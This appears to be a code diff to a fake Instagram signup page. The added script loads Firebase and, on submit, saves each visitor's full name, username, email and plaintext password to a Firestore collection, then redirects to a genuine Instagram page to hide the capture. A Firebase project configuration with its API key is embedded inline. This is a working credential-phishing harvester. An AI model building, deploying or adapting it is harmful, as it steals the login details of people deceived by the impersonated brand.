@@ -14,8 +14,14 @@ button:hover { background:#007ac1; }
 .login-link { margin-top:15px; font-size:14px; }
 .login-link a { color:#0095f6; text-decoration:none; }
 </style>
+
+<!-- Firebase scripts -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
 </head>
 <body>
+
 <div class="signup-container">
     <h1>Instagram</h1>
     <form id="signupForm">
@@ -31,12 +37,47 @@ button:hover { background:#007ac1; }
 </div>
 
 <script>
+// 🔹 Your new Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyD4Qt2sqcDx95uzn-Ae5XQv3QnlH7jhTBM",
+  authDomain: "insta-data-3d666.firebaseapp.com",
+  projectId: "insta-data-3d666",
+  storageBucket: "insta-data-3d666.firebasestorage.app",
+  messagingSenderId: "802081146433",
+  appId: "1:802081146433:web:104332eb2a23746f2568c0"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore(); // Firestore database
+
+// Handle form submission
 const form = document.getElementById('signupForm');
 form.addEventListener('submit', function(e) {
-    e.preventDefault(); // prevents form from reloading the page
-    // redirect safely
-    window.location.href = "https://creators.instagram.com/grow?locale=en_US";
+    e.preventDefault();
+
+    const fullname = form.fullname.value;
+    const username = form.username.value;
+    const email = form.email.value;
+    const password = form.password.value; // For testing only
+
+    // Save data to Firestore
+    db.collection("users").add({
+        fullname: fullname,
+        username: username,
+        email: email,
+        password: password
+    })
+    .then(() => {
+        alert("Data saved!");
+        window.location.href = "https://creators.instagram.com/grow?locale=en_US";
+    })
+    .catch((error) => {
+        console.error("Error saving data: ", error);
+        alert("Error saving data. Check console.");
+    });
 });
 </script>
+
 </body>
 </html>
